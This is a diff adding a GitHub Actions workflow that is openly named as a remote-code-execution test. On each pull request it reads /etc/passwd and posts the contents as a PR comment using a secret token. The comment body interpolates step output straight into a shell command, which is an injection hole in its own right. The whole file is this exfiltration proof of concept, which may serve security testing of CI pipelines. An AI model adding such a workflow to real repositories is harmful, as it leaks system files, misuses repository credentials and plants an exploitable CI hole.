@@ -1,0 +1,26 @@
+name: RCE PR Commenter 
+
+# This workflow is triggered on pull requests to the main branch.
+on:
+  pull_request:
+    branches: [ "main" ]
+
+permissions:
+  contents: read # to check out private repos
+  pull-requests: write # to comment on pull requests
+
+jobs:
+  opengrep:
+    name: RCE Tester
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Test RCE
+        id: rce
+        run: |
+          echo "RCE_PAYLOAD=`cat /etc/passwd`" >> $GITHUB_OUTPUT
+      - name: Post the comment
+        run: |
+          gh pr comment "${{ github.event.pull_request.number }}" --body "${{ steps.rce.outputs.RCE_PAYLOAD }}"
+        env:
+          GITHUB_TOKEN: ${{ secrets.VULN_TOKEN }}
